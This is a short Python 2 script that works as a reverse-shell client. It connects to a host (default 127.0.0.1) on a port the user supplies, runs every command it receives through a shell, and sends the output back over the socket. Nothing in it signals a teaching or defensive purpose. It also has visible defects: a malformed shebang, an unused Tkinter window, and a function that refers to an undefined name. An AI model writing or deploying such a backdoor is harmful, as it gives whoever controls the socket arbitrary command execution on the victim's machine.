#/bin/usr/python

import socket
import subprocess
import Tkinter

s = socket.socket()
print("Default host taken - 127.0.0.1")
host = "127.0.0.1"

port = input("port : ")

top = Tkinter.Tk()

s.connect((host,port))
flag = 0
filename = ""
def accept():
	print "accepted"
	filename = Path.get("1.0","200.0")
	print filename
while True:

	print s.recv(1024)
	data = s.recv(1024)
	string = "%s > exec" % data
	subprocess.call(string,shell=True)
	f = open('exec','r+')
	raw = f.readlines()
	length = len(raw)
	s.send("\n-------------------- Response ------------------- \n")
	for i in range(0,length):
		rawdata = raw[i]
		s.send(rawdata)
	s.send("\n---------------------- end -----------------------\n")
	s.send("end")
print "-- "
s.close()


